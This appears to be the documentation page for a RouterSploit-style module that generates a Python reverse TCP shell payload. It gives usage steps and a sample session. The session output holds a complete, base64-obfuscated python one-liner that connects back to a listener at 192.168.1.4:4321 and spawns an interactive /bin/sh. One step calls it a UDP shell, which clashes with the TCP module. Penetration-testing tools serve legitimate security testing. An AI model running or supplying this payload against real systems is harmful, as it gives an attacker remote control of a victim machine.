## Description

Module generates payload that creates interactive tcp reverse shell by using python one-liner. 

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/cmd/python_reverse_tcp`
  3. Do: `set lhost 192.168.1.4`
  4. Do: `set lport 4321`
  5. Do: `run`
  6. Module generates python udp reverse shell payload

## Scenarios

```
rsf > use payloads/cmd/python_reverse_tcp
rsf (Python Reverse TCP One-Liner) > set lhost 192.168.1.4
[+] lhost => 192.168.1.4
rsf (Python Reverse TCP One-Liner) > set lport 4321
[+] lport => 4321
rsf (Python Reverse TCP One-Liner) > run
[*] Running module...
[*] Generating payload
python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoJzE5Mi4xNjguMS40Jyw0MzIxKSkKb3MuZHVwMihzLmZpbGVubygpLDApCm9zLmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKcD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk='.decode('base64'))"
```
